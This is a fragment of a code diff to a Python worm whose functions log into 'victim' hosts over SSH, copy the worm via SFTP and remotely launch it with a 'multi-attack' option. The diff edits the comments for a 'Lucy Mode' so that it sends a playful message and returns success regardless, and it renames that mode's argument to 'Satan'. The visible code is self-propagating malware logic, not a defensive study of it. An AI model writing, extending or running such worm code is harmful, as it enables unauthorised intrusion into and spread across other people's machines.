@@ -35,8 +35,8 @@ def connect_to_victim(host, user, password):
     
 def transfer_worm(ssh, LucyMode = False):
     #Connect to SFTP and transfer files
-    #Standard Mode, check files for the Mark of the Worm, transfer if not found, otherwise abort
-    #Lucy Mode, send files anyways
+    #Standard Mode, check files for the Mark of the Worm, transfer if not found
+    #Lucy Mode, send playful message and return success code regardless
     
     try:
         ftp = ssh.open_sftp()
@@ -63,7 +63,7 @@ def transfer_worm(ssh, LucyMode = False):
 def worm_victim(ssh, lucy = False):
     #start worm.py
     try:
-        cmd = 'python3 worm.py multi-attack Lucy' if lucy else 'python3 worm.py'
+        cmd = 'python3 worm.py multi-attack Satan' if lucy else 'python3 worm.py'
         ssh.exec_command(cmd)
         return True
     except Exception as error:
